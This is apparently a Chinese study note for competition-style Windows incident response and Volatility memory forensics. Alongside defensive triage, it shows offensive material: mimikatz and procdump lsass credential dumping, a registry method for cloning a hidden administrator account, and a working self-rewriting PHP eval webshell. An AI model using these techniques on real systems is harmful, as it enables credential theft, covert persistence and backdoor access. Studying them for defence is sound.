# Information Forensics

Arch：Windows

## 0x01 Respond*

### InformationGathering

```shell
ipconfig #查看ip信息
netstat -an #查看本地开放的端口服务
arp -a #arp缓存表
route print #查看当前路由表
systeminfo #显示当前系统信息
```

```bat
attrib /?
#显示或更改文件属性。

ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]
       [drive:][path][filename] [/S [/D]] [/L]

  +   设置属性。
  -   清除属性。
  R   只读文件属性。
  A   存档文件属性。
  S   系统文件属性。
  H   隐藏文件属性。
  O   脱机属性。
  I   无内容索引文件属性。
  X   无清理文件属性。
  V   完整性属性。
  P   固定属性。
  U   非固定属性。
  [drive:][path][filename]
      指定属性要处理的文件。
  /S  处理当前文件夹及其所有子文件夹中
      的匹配文件。
  /D  也处理文件夹。
  /L  处理符号链接和
      符号链接目标的属性
```

```bat
attrib +R 1.txt #使用该命令后文件保存时只能另存 因为该文件只读不可修改
attrib +R +S +H 1.txt #使用该命令后文件变为系统文件并隐藏 不可写入
attrib -R -S -H 1.txt #消除该文件的属性
```

```bat
echo Hello_flag > 1.txt:2.txt #此时打开1.txt发现是空文件并且大小为0kb 因为是个隐藏文件流
```

```bat
C:\Users\SxyLao1\Downloads>dir /?
显示目录中的文件和子目录列表。

DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N]
  [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4]

  [drive:][path][filename]
              指定要列出的驱动器、目录和/或文件。

  /A          显示具有指定属性的文件。
  属性         D  目录                R  只读文件
               H  隐藏文件            A  准备存档的文件
               S  系统文件            I  无内容索引文件
               L  重新分析点          O  脱机文件
               -  表示“否”的前缀
  /B          使用空格式(没有标题信息或摘要)。
  /C          在文件大小中显示千位数分隔符。这是默认值。用 /-C 来
              禁用分隔符显示。
  /D          跟宽式相同，但文件是按栏分类列出的。
  /L          用小写。
  /N          新的长列表格式，其中文件名在最右边。
  /O          用分类顺序列出文件。
  排列顺序     N  按名称(字母顺序)     S  按大小(从小到大)
               E  按扩展名(字母顺序)   D  按日期/时间(从先到后)
               G  组目录优先           -  反转顺序的前缀
```

```cmd
dir /s #查看当前目录下的系统文件
dir /a #查看当前目录下的所有文件
？#查看隐藏流文件的文件名
dir /r # /R 显示文件的备用数据流
notepad 1.txt:2.txt #查看隐藏流文件
```

#### SystemPasswd

Windows系统登录的时，输入user:passwd后，从注册表SAM中读取user:passwd的hash加密进行校验，通过后将通过的hash值保存在lsass.exe中，系统登录

管理员权限打开mimikatz，[GitHub - ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)
[两步完成利用procdump64+mimikatz获取win用户密码 - 夏天公子 - 博客园 (cnblogs.com)](https://www.cnblogs.com/chenglee/p/9366399.html)
[mimikatz在Win10及2012系统以后的明文抓取方式_mimikatz获取密码_netsec_steven的博客-CSDN博客](https://blog.csdn.net/netsec_steven/article/details/107257325)

```bat
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 703667 (00000000:000abcb3)
Session           : Interactive from 1
User Name         : SxyLao1
Domain            : DESKTOP-1L1N9E3
Logon Server      : DESKTOP-1L1N9E3
Logon Time        : 2023/3/14 15:12:12
SID               : S-1-5-21-4064297522-703208922-1005251153-1000
        msv :
         [00000003] Primary
         * Username : SxyLao1
         * Domain   : DESKTOP-1L1N9E3
         * NTLM     : 9a63389440b621b692ca7707a9d3d993 #加密后的密码为NTML 不需要密码有NTML
         * SHA1     : 4de6cf4463841a49387081cc042e9aa1b81939d8
        tspkg :
        wdigest :
         * Username : SxyLao1
         * Domain   : DESKTOP-1L1N9E3
         * Password : (null)
        kerberos :
         * Username : SxyLao1
         * Domain   : DESKTOP-1L1N9E3
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz #
```

系统登录之后密码进行加密交给Isass进程进行校验处理，此时可以通过该进程抓取密码，右键创建转储文件。
打开任务管理器的进程，排序找到lsass.exe程序选中右键选择生成转储文件并打开文件所在位置得到转储文件。
或者使用如下命令获取转储文件：

```bat
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

得到转储文件后用mimikatz操作获取密码：

```shell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

mimikatz也可以对dpapi进行提取，dpapi是Data Protection API，即保护数据的接口。
DPAIP使用了Master Key的东西用来加解密，但Master Key不存在磁盘上，是通过用户密码HASH加密生成。

```shell
mimikatz # sekurlsa::dpapi

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-1L1N9E3$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/3/14 15:11:33
SID               : S-1-5-18
         [00000000]
         * GUID      :  {2d5f3f2e-c0c9-4a00-bf95-cba7ae761249}
         * Time      :  2023/3/14 15:55:45
         * MasterKey :  b3ce2c4d7868eddb7009cfeae9123ca65bf66e9f9a836cf4b269041a1a880247f60359069622f07777a45b7afe3c59b4a24ac4a5a66ed04017c05a14567e2b1b
         * sha1(key) :  b52ff6357141ea62e5d80b7b10b7a6597168e9d5
         [00000001]
         * GUID      :  {72b0a00e-d09c-433e-a6c9-84f49d444371}
         * Time      :  2023/3/14 15:17:57
         * MasterKey :  5756344bb005cad6713a6b9a3dc2ca07bedf3e55024bab00a483532064648db57be471e8a80b08ca4a04389f06e14c1f78f2d26c7a3b086ac784824f677eb526
         * sha1(key) :  ace8c104dc2d56428c05636a63c1db67058e41c3
```

#### BroswerPasswd

浏览器缓存文件一般在家目录下的`%localappdata%`

```
C:\Users\SxyLao1\AppData\Local\Google\Chrome\User Data\Default
```

在如上路径中可以找到`Login Data`文件，使用notepad++打开，可以看见里面有类似SQL语句的内容，这是因为数据以SQLite形式存储
`Login Data`文件就是由DPAPI进行保护的，同时DPAPI也是由Master Key进行加密的，即通过mimikatz拿到Master Key即可进行解密。

#### RecentFile

`%userprofile%\Recent`或者`Win + R`输入`recent`
比赛的时候一般此处可能会保存一些shell文件或者线索文件

#### Hosts

```shell
C:\Windows\System32\drivers\etc\hosts
```

访问网址的时候首先就会来查询Hosts文件，如果内有记录就会直接进入，否则就会进行DNS域名解析等一系列操作。

#### Middleware

[D盾防火墙 (d99net.net)](http://www.d99net.net/)
需要对中间件的源代码查杀`Shell`，推荐工具`D盾`

#### UserManager

```cmd
whoami #查看当前用户吗
whoami /all #查看当前用户的所有信息
net user #列出系统用户信息
```

`wmi`是一个 windows 管理组件，`Windows Management Instrumentation`是基于 Windows 的操作系统上管理数据和操作的基础结构。可以编写 WMI 脚本或应用程序来自动执行远程计算机上的任务。

```bat
wmic /all
wmic process get * #获取所有的进程信息
wmic SYSACCOUNT get * #获取系统账户所有信息
wmic SYSACCOUNT get name,sid #获取系统账户名和sid值
wmic USERACCOUNT get name,sid #获取用户账户名和sid值
Name                SID #这条命令写一下输出结果 SID最后一个'-'后的即为编号 数值越小权限越大 Administrator权限最高
Administrator       S-1-5-21-3710927514-625496743-2172921099-500
DefaultAccount      S-1-5-21-3710927514-625496743-2172921099-503
Guest               S-1-5-21-3710927514-625496743-2172921099-501
SxyLao1             S-1-5-21-3710927514-625496743-2172921099-1001
WDAGUtilityAccount  S-1-5-21-3710927514-625496743-2172921099-504
```

```shell
net user test$ test /add 
#添加一个test用户 密码为test '$'表示隐藏账户 net user命令无法查看到该用户 因为是隐藏账户 下面演示如何查看该隐藏账户
```

`Win + R`输入`regedit`打开注册表来到`\HKEY_LOCAL_MACHINE\SAM\SAM`路径下选中右键SAM，为当前使用的用户在SAM文件文件权限上增加完全控制的权限。点击`添加`，将用户名输入进`输入对象名来选择(示例)(E):`中，然点击`检查名称`，点击确定完成添加。权限在`完全控制`上打对勾，应用并确认。
在菜单栏的查看中点击刷新或者按F5刷新，如此当前登录的用户便可以查看到SAM文件下的内容了。

```reg
\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
```

![image-20230314194631443](.\Forensics\Regedit_UserPermissionEdit.png)

![image-20230314195135505](.\Forensics\Regedit_UserPermissionChange.png)

**当隐藏账户被创建后便可以从此处的注册表查看，如下图**

![image-20230314200101032](.\Forensics\HowToFindHiddenAccount.png)

或者在`控制面板 > 用户账户 > 用户账户 > 管理账户`中查看隐藏账户
![image-20230314200449507](.\Forensics\HiddenAccountFound.png)

**克隆用户**
如果不希望控制面板被看到隐藏用户，可以回到刚才的注册表Names位置，将test用户的注册表导出，将其SID码改为Adminstrator的\xF4\x01(即01F4)，然后在 cmd 中将test用户删除 net user test$ /del。这时控制面板中的隐藏用户将会消失，接着将刚才到处并修改的test用户注册表文件xxx.reg导入到adminstrator中。此时将拥有一个有着Adminstrator权限的test用户使用，并且不会被作为隐藏用户查到

#### NetworkConnections

[常见端口号一览（详细）\_8989端口_petershina的博客-CSDN博客](https://blog.csdn.net/petershina/article/details/16981605?ops_request_misc=%7B%22request%5Fid%22%3A%22167879775816800225551393%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167879775816800225551393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-16981605-null-null.142^v73^pc_search_v2,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=常见Port&spm=1018.2226.3001.4187)

```bat
netstat -an #查看当前端口开放情况 协议、本地地址、外部地址、状态
netstat -ant #查看当前端口开放情况 协议、本地地址、外部地址、状态、卸载状态
```

[常见端口] 
Web相关：80(Http) 8080(Web服务) 443(Https) 8000-9000
数据库相关：3306(Mysql) 1433(SQL Server) 1521(Orcal) **6379(Redis 未授权漏洞)**
服务相关：22(ssh) 21(ftp) **445(smb ms17_010 smb连接共享)**

#### ProcessAnalyse

```bat
netstat -ano #查看当前端口开放情况 协议、本地地址、外部地址、状态、PID
tasklist /svc #查看当前服务程序信息
#netstat中显示的PID号与tasklist的PID对照即可找到对应程序 再通过程序找到它的绝对路径
tasklist /svc | findstr "10452"
```

#### StartsAutomatically

注册表，服务，定时任务/计划任务，启动项可以做到自动启动(持久化控制)

当前用户下的自动启动文件夹，`C:\Users\SxyLao1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
`Win + R`输入`msconfig`进入系统配置，可以查看到系统的自启动文件夹

##### 定时任务/计划任务

at (Windwos7及以前版本可用)` & `schtasks(迭代后使用该程序进行定时任务)` 

```powershell
at 11:15:37 calc.exe
at #查看定时任务
at 1 /del #删除1号定时任务
```

`Win + R`输入`schtasks`进入定时任务管理界面

```powershell
PS C:\Windows\system32> schtasks /?
SCHTASKS /parameter [arguments]
描述:
    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任
    务。
参数列表:
    /Create         创建新计划任务。
    /Delete         删除计划任务。
    /Query          显示所有计划任务。
    /Change         更改计划任务属性。
    /Run            按需运行计划任务。
    /End            中止当前正在运行的计划任务。
    /ShowSid        显示与计划的任务名称相应的安全标识符。
    /?              显示此帮助消息。
Examples:
    SCHTASKS
    SCHTASKS /?
    SCHTASKS /Run /?
    SCHTASKS /End /?
    SCHTASKS /Create /?
    SCHTASKS /Delete /?
    SCHTASKS /Query  /?
    SCHTASKS /Change /?
    SCHTASKS /ShowSid /?
```

```powershell
schtasks /create /? #查看create选项后可选择的参数
 ==> 创建计划任务 "gaming"，每天从 12:00 点开始到
        14:00 点自动结束，运行 freecell.exe。

        SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00
schtasks /create /sc minute /tn test /tr calc.exe #每一分钟执行一次名为test定时任务 任务中执行程序为calc.exe
schtasks /query /tn test #查询名为test的定时任务

文件夹: \
任务名                                   下次运行时间           模式
======================================== ====================== ===============
test                                     2023/3/15 11:30:00     就绪
schtasks /delete /tn test #删除名为test的定时任务
警告: 确实要删除任务 "test" 吗 (Y/N )? y
成功: 计划的任务 "test" 被成功删除。
schtasks /delete /f /tn test #强行删除名为test的定时任务不需要询问
```

##### 注册表

> 64位系统
> HKLM\Software\Microsoft\Windows\Currentversion\Run
> HKCU\Software\Microsoft\Windows\Currentversion\Run
> HKCU\Software\Microsoft\Windows\Currentversion\RunServices
>
> 32位系统
> HKLM\Software\Wow6432Node\Microsoft\Windows\Currentversion\Run
> HKCU\Software\Wow6432Node\Microsoft\Windows\Currentversion\Run
> HKCU\Software\Wow6432Node\Microsoft\Windows\Currentversion\RunServices

一次性启动项，下次启动会自动删除

>64位系统
>HKLM\Software\Microsoft\Windows\Currentversion\RunOnce
>HKCU\Software\Microsoft\Windows\Currentversion\RunOnce
>HKCU\Software\Microsoft\Windows\Currentversion\RunServicesOnce
>
>32位系统
>HKLM\Software\Wow6432Node\Microsoft\Windows\Currentversion\RunOnce
>HKCU\Software\Wow6432Node\Microsoft\Windows\Currentversion\RunOnce
>HKCU\Software\Wow6432Node\Microsoft\Windows\Currentversion\RunServicesOnce

```powershell
PS C:\Windows\system32> reg query HKLM\Software\Microsoft\Windows\Currentversion\Run
#以此查找黑客开机自启的后门
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    Sysdiag    REG_SZ    "C:\Program Files (x86)\Huorong\Sysdiag\bin\HipsTray.exe"
```

##### 服务

`Win + R`输入`services.msc`打开服务管理

```cmd
sc /? #SC 是用来与服务控制管理器和服务进行通信的命令行程序
sc create testservices binpath="calc.exe" binpath="calc.exe" start="auto" #创建testservices服务 路径calc.exe 自动启动
sc query testservices #查询名为testservices的服务信息
sc start testservices #启动名为testservices的服务信息
sc delete testservices #删除名为testservices的服务信息
```

Windows最重要的几个模块：
rundll32.exe：加载和运行32位动态链接库。
gdi32.dll：系统用来绘制图形窗口的dll库。

#### FileAnalysis

[VirusTotal - Home](https://www.virustotal.com/gui/home/upload)
[微步云沙箱:https://s.threatbook.com](https://s.threatbook.com/)

### MaintainTheFirstScene

尽可能实现的情况下去维持第一现场，无论谁被打穿了都会慌，一慌就推卸责任甚至消灭痕迹，这无疑帮助了攻击者完成了渗透的最后一步。"第一"指的是最先发现情况的人，这个人所说的情况。发现的被攻陷的主体，最好用镜像把系统和流量先扒下来。时间越延迟，这个"第一"事实的失真率越高，所以要安服和应急人员做好配合。

### LogTypeOfAnalysis

Web入侵，网站被上传了黑链(跳转到黄赌毒网站)，往往伴随着大量的webshell，系统入侵；
勒索病毒，尝试公开解密或者查询家族，大多数不可解，只能尝试溯源，排查风险；
挖矿病毒，多为门罗币挖矿，从进程类进行查杀，排查可能存在被暴力破解进行感染；
木马程序，远控程序(Cobaltstrike，msf)，
其他，例如DDOS，ARP攻击等。

## 0x02 Blocking

阻断只有三步：关站、关服务、拔网线。
这一步是应急响应的最终目的，无论实施过程如何、无论使用什么工具都必须保证被保护与沦陷方的隔离。
隔离核心资产是为了做到三个原则：保护、避害、不损害。
隔离受害主体(群体)是为了保护第一现场、收集攻击者信息等。

## 0x03 Analyse*

### 1)Data、Traffic、SampleAnalysis

(1) 是否有异常进程、用户
(2) 敏感端口开放情况
(3) 密码强度
(4) 日志分析
(5) 异常启动项、服务、计划任务
(6) 注册表信息
(7) 其他

### 2)Behavior Analysis & Restore Attack Process

[Autoruns](https://download.sysinternals.com/files/Autoruns.zip)
TCPview
ProcEXP
PCHunter
[Atool](https://www.antiy.com/tools/Atool.rar) <== 网址

从行为出发，还原攻击路径，推演攻击过程。
行为分析基于三大件分析，结合系统表现出来的情况做分析，例如：启动项、启动脚本、进程、内存等。
还原攻击过程需要对攻击大致的情况有一个综合判断，可以理解为`威胁模型建立(SDL)`，必须具备渗透能力，在此基础上放入沙箱重新浮现攻击过程，对后续的步骤提供帮助。

## 0x04 Clean*

### 1)Non-adversarial

在不存在对抗的情况下，最极端就是全盘重装，稍次就是数据迁移后对系统盘重装。在普通比赛情况下，可以进行针对性的杀进程、删文件、杀软清除。

### 2)Adversarial

#### 不死马

```php
<?php //最简单的不死马
    ignore_user_abort(true); #该函数如果设置为TURE及与用户断开后脚本将正常运行 默认情况下是FALSE断开程序也停止
	set_time_limit(0); #程序将不会有超时
	unlink(__FILE__);
	$file = '3.php';
	$code = '<?php if(md5($_GET["pass"])=="laldc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);}?>';
	//pass=pass
	while (1) {
        file_put_contents($file, $code); #死循环向3.php写入木马
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(5000);
    }
?>
```

不死马对抗思路：
写一个死循环删除文件的脚本、
对写入木马的文件夹修改"写"权限、
停止Apache服务删除木马再重启不死马就不会再写文件了

#### 高权限启动

```cmd
taskkill /? #查询杀死进程命令用法
taskkill /f /im hipstray.exe #强制 指定终止进程名称
```

[Overview - Process Hacker (sourceforge.io)](https://processhacker.sourceforge.io/)

二进制程序以0环权限运行，3环权限无法杀死，使用如上链接中的工具。Process Hacker是运行在0环上的进程工具，以**管理员权限**打开可以直接杀死火绒进程。

## 0x05 Reinforce*

# Memory Forensics

[Release Downloads | Volatility Foundation](https://www.volatilityfoundation.org/releases)
[[volatility源码版本安装 - Weird请221522 - 博客园 (cnblogs.com)](https://www.cnblogs.com/weird1522/p/15388594.html)
[Command Reference · volatilityfoundation/volatility Wiki · GitHub](https://github.com/volatilityfoundation/Volatility/wiki/Command-Reference)

```cmd
volatility_2.6_win64_standalone -h #查看vlaitlity取证工具的命令手册
volatility.exe -f test.vmem imageinfo #读取基本信息

volatility -f XpProTesting-Snapshot4.vmem imageinfo #镜像信息
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search... #KDBG跟内核相关 不用管
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) #排最前的是匹配可能性最大的系统 比赛就写第一个
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (F:\Vmpc\Windows\XP_Testing\XpProTesting-Snapshot4.vmem)
                      PAE type : No PAE
                           DTB : 0x39000L
                          KDBG : 0x80538d60L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2022-10-25 15:32:10 UTC+0000
     Image local date and time : 2022-10-25 23:32:10 +0800
     
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist #指定系统并查询进程列表
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x81fbd838 System                    4      0     51      215 ------      0
0x81ad3020 smss.exe                340      4      3       21 ------      0 2022-10-25 15:16:54 UTC+0000
0x81b10408 csrss.exe               472    340     11      366      0      0 2022-10-25 15:16:54 UTC+0000
0x81eadda8 winlogon.exe            624    340     19      456      0      0 2022-10-25 15:16:55 UTC+0000
0x81eb0560 services.exe            668    624     20      302      0      0 2022-10-25 15:16:55 UTC+0000
0x81bab020 lsass.exe               680    624     23      315      0      0 2022-10-25 15:16:55 UTC+0000
0x81ed94c0 vmacthlp.exe            832    668      1       27      0      0 2022-10-25 15:16:55 UTC+0000
0x81ec87f8 svchost.exe             872    668      9      243      0      0 2022-10-25 15:16:55 UTC+0000
0x81e535d8 svchost.exe             972    668     80     1279      0      0 2022-10-25 15:16:55 UTC+0000
0x81f17020 svchost.exe            1044    668      4       70      0      0 2022-10-25 15:16:55 UTC+0000
0x81da97f0 svchost.exe            1060    668     13      153      0      0 2022-10-25 15:16:55 UTC+0000
0x81e6ad80 spoolsv.exe            1296    668     10      131      0      0 2022-10-25 15:16:56 UTC+0000
0x81e081c0 explorer.exe           1632   1580     11      289      0      0 2022-10-25 15:17:13 UTC+0000
0x81a38a58 vmtoolsd.exe           1760   1632      6      205      0      0 2022-10-25 15:17:13 UTC+0000
0x81c03b30 ctfmon.exe             1772   1632      1       52      0      0 2022-10-25 15:17:13 UTC+0000
0x816a5880 msmsgs.exe             1784   1632      2      128      0      0 2022-10-25 15:17:13 UTC+0000
0x81d686a0 VGAuthService.e        1948    668      2       63      0      0 2022-10-25 15:17:15 UTC+0000
0x81e32b30 vmtoolsd.exe           2012    668      7      228      0      0 2022-10-25 15:17:15 UTC+0000
0x81b48b68 wmiprvse.exe            424    872      9      190      0      0 2022-10-25 15:17:23 UTC+0000
0x81a9fb90 cmd.exe                 468   1632      1       22      0      0 2022-10-25 15:17:25 UTC+0000
0x81b78da8 conime.exe              404    468      1       24      0      0 2022-10-25 15:17:25 UTC+0000
0x81d58938 cmd.exe                1188   1632      1       18      0      0 2022-10-25 15:18:23 UTC+0000
0x81bb89a0 ntvdm.exe              1200   1188      3       38      0      0 2022-10-25 15:18:30 UTC+0000

volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0x81fbd838:System                                      4      0     51    215 1970-01-01 00:00:00 UTC+0000
. 0x81ad3020:smss.exe                                 340      4      3     21 2022-10-25 15:16:54 UTC+0000
.. 0x81b10408:csrss.exe                               472    340     11    366 2022-10-25 15:16:54 UTC+0000
.. 0x81eadda8:winlogon.exe                            624    340     19    456 2022-10-25 15:16:55 UTC+0000
... 0x81bab020:lsass.exe                              680    624     23    315 2022-10-25 15:16:55 UTC+0000
... 0x81eb0560:services.exe                           668    624     20    302 2022-10-25 15:16:55 UTC+0000
.... 0x81e6ad80:spoolsv.exe                          1296    668     10    131 2022-10-25 15:16:56 UTC+0000
.... 0x81d686a0:VGAuthService.e                      1948    668      2     63 2022-10-25 15:17:15 UTC+0000
.... 0x81ed94c0:vmacthlp.exe                          832    668      1     27 2022-10-25 15:16:55 UTC+0000
.... 0x81e535d8:svchost.exe                           972    668     80   1279 2022-10-25 15:16:55 UTC+0000
.... 0x81da97f0:svchost.exe                          1060    668     13    153 2022-10-25 15:16:55 UTC+0000
.... 0x81e32b30:vmtoolsd.exe                         2012    668      7    228 2022-10-25 15:17:15 UTC+0000
.... 0x81ec87f8:svchost.exe                           872    668      9    243 2022-10-25 15:16:55 UTC+0000
..... 0x81b48b68:wmiprvse.exe                         424    872      9    190 2022-10-25 15:17:23 UTC+0000
.... 0x81f17020:svchost.exe                          1044    668      4     70 2022-10-25 15:16:55 UTC+0000
 0x81e081c0:explorer.exe                             1632   1580     11    289 2022-10-25 15:17:13 UTC+0000
. 0x81d58938:cmd.exe                                 1188   1632      1     18 2022-10-25 15:18:23 UTC+0000
.. 0x81bb89a0:ntvdm.exe                              1200   1188      3     38 2022-10-25 15:18:30 UTC+0000
. 0x81a38a58:vmtoolsd.exe                            1760   1632      6    205 2022-10-25 15:17:13 UTC+0000
. 0x81a9fb90:cmd.exe                                  468   1632      1     22 2022-10-25 15:17:25 UTC+0000
.. 0x81b78da8:conime.exe                              404    468      1     24 2022-10-25 15:17:25 UTC+0000
. 0x81c03b30:ctfmon.exe                              1772   1632      1     52 2022-10-25 15:17:13 UTC+0000
. 0x816a5880:msmsgs.exe                              1784   1632      2    128 2022-10-25 15:17:13 UTC+0000
```

![image-20230316154616371](.\Forensics\VolatilityDump.png)

如图输入`volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump`之后每个账户后会出现两串hash值，一般来讲win2008以后第一个hash已经被弃用，所以只用第二个hash值。将hash值输入[md5在线解密破解,md5解密加密 (cmd5.com)](https://www.cmd5.com/)网站进行解密即可得到密码。

![image-20230316155137156](.\Forensics\cmd5getPasswd.png)

```cmd
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 lsadump #从lsass注册表读取密码
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 iehistory #读取ie浏览器的历史记录
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan #读取端口连接状态 即系统执行netstat -an
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 notepad #显示正在打开的记事本中的内容 配合pslist
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist #读取可读取的注册表配置单元
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivedump -o 0xfffff80000ce3010 #读取所有hive
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff80000ce3010 -K "SAM\Domains\Account\Users\000001F4" #显示指定路径注册表项中的具体信息
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 userasslist #读取用户最后运行状态
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 filescan #扫描当前系统中的全部文件
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000065675500 -D file/ #-D表示保存路径
#导出指定地址file目录下的所有文件至当前目录
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -p 520 -D file/ #导出所有520进程的dll文件
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 memdump -p 520 -D file/ #转储当前内存中的520进程
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 screenshot #获取当前系统的桌面截图
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan #扫描输出所有的服务名称
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline #命令行形式查看启动的服务&程序
```

```cmd
#获取admin用户密码
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 lsadump #从lsass注册表读取密码
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码
#IP和主机名
ipconfig
netstat -an
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan #读取端口连接状态 即系统执行netstat -an
hostname
\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ComputerName 注册表查看主机名 
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist 通过该命令获取到\REGISTRY\MACHINE\SYSTEM的偏移
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivedump -o 0xfffff8a000024010 > 1.txt #导出\REGISTRY\MACHINE\SYSTEM的所有子项 然后在1.txt中寻找computer或者name找到所需信息
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff8a000024010 -K  "ControlSet001\Control\ComputerName\ComputerName" 直接输出注册表项内容拿下主机名
#桌面flag.txt文件内容
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 filescan | findstr "flag" #直接找到flag.txt的信息和地址偏移
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfile -Q 0x00000007f1b6c10 -D file\ #将偏移地址处的flag.txt放在file\中
拿到文件后正常查看即可得到flag
#服务器中存在一个挖矿病毒 矿池地址是什么
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan | findstr "ESTABLISHED" 寻找网络连接已连接的项目 直接拿到IP:PORT
#恶意代码在系统中注册了服务 服务名是什么
上一题中拿到了挖矿病毒的进程号PID 在进程列表中寻找对应的PID
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist | findstr "2588" #然后拿到了其父进程3036
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree 不停的对父进程溯源 寻找服务程序
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan > svc.txt 进去查找进程号或其他相关信息
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline -p 3036 #也可以查到服务名
#获取恶意进程的进程名PID
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist 上面命令大差不差
#病毒在自我删除时执行的命令是什么
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 mendump -p 3036 -D file/ #导出所有3036进程的dll文件
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 mendump -p 2588 -D file/ #导出所有2588进程的dll文件
病毒自我删除必然会调用delete，得到转储文件之后直接寻找delete字符查找
```

![image-20230316170338889](.\Forensics\RegeditHostname.png)

```cmd
#张三发现电脑中毒了，他折腾了下找到并删除了病毒，但过几天重要文件被盗，张三又发现了该病毒，请分析失窃原因。flag:flag(文件名32位md5)
volatility -f XpProTesting-Snapshot4.vmem imageinfo #先查看镜像信息
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码 可以直接看见隐藏账号
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist #查看进程发现metsvc.exe服务 400端口 即metasploit生成的后门程序
volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline -p 400 #查看400号端口上的进程信息 直接拿到服务所在路径
注册表服务路径：\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services
